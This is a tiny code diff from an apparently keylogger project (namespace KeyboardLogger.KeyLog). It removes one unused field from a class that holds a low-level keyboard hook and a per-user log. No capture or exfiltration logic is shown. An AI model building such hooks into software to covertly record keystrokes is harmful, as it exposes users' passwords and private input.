@@ -15,7 +15,6 @@ namespace KeyboardLogger.KeyLog
     class KbdHook
     {
         // data
-        static string user;
         static IntPtr hHook = IntPtr.Zero;
         static LowLevelKeyboardProc kydbHookProc;
         static Log userLog = new Log(Environment.UserName);
